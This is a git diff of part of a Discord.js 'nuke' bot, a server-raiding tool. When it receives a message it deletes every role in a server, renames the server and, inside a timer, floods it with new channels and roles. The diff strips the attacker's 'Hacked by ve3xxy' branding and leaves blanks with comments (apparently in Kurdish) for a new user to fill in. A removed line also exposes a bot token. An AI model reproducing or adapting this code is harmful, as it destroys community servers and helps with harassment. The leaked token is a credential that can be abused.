@@ -15,14 +15,14 @@ client.on("message", message => {
       message.guild.roles.forEach(r => {
         r.delete();
       });
-      message.guild.setName("Ve3xxy is here");
+      message.guild.setName("");////nawek dane bo sar server 
       setInterval(function() {
-        message.guild.createChannel("Hacked by ve3xxy", "voice");
-        message.guild.createChannel("Hacked By ve3xxy", "text");
-        message.guild.createRole({ name: "Ve3xxy is here" });
+        message.guild.createChannel("", "voice");///////bo channel 
+        message.guild.createChannel("", "text");////bo voice
+        message.guild.createRole({ name: "" });////nawek dane bo role kan
       });
     }
   }
 });
 
-client.login("ODI0OTg4OTE3OTI4Mjk2NDU5.YF3YzQ.0TigR4IGz-C_iN_l4PlNub404oc");
+client.login("");
